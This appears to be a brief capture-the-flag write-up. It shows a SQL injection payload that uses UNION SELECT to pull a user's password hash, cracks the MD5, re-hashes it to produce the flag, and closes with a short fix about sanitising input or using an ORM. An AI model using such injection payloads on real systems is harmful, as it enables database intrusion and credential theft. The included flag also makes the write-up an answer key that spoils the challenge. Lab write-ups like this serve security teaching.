1 UNION SELECT user_id, countersign FROM users where user_id = CHAR(53)
    - "5ff9d0165b4f92b14994e5c685cdce28" which is an md5, decrypt it and get "FortyTwo"
    - Lower "FortyTwo" to fortytwo and hash it with sha256 and get the flag "10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"

Resolution :
    - The server need the sanitize form fields before use them into a sql queri or user and ORM.
